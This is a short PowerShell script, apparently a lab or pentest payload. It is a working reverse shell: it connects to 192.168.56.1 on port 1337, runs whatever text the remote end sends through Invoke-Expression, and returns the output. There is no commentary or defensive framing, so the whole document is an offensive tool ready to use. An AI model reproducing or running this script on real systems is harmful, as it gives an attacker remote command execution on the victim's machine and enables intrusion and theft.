$LHOST = '192.168.56.1';
$LPORT = 1337;
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream();
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
$StreamWriter.AutoFlush = $true;
$Buffer = New-Object System.Byte[] 4096;

while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {

    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead -1)
    
    if ($Code.Length -gt 1) {
        $Output = try {
            Invoke-Expression ($Code) 2>&1
        } catch { $_ };

        $StreamWriter.Write("$Output`n");
    }
};
